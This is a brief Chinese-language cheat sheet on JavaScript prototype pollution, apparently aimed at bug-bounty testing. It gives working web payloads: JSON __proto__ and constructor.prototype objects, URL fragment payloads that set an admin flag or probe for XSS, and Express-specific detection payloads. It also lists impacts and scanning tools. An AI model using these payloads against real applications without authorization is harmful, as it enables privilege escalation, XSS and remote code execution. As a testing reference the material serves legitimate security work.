# 原型污染

## 核心原理
修改 `Object.prototype` 属性，所有 JS 对象都继承它，污染级联全应用。

## 攻击向量

### JSON 输入污染
```json
{"__proto__": {"evilProperty": "evilPayload"}}
{"constructor": {"prototype": {"foo": "bar"}}}
```

### URL 污染
```
https://victim.com/#a=b&__proto__[admin]=1
https://example.com/#__proto__[xxx]=alert(1)
```

### ExpressJS 特定测试
```json
{"__proto__": {"parameterLimit": 1}}
{"__proto__": {"ignoreQueryPrefix": true}}
{"__proto__": {"allowDots": true}}
{"__proto__": {"status": 510}}
```

## 影响
- **服务端（SSPP）**：RCE（如 Kibana CVE-2019-7609）
- **客户端（CSPP）**：XSS、绕过 HTML 消毒器、DoS

## 工具
- **pp-finder** — 找 gadget
- **PPScan** — 客户端扫描器
- **silent-spring** — Node.js RCE 演示
- **PortSwigger Burp 扩展** — 服务端检测

## SRC 实战要点
- Node.js 应用必测
- 找 gadget 比找污染点更难
- 污染 + gadget = RCE = 严重漏洞
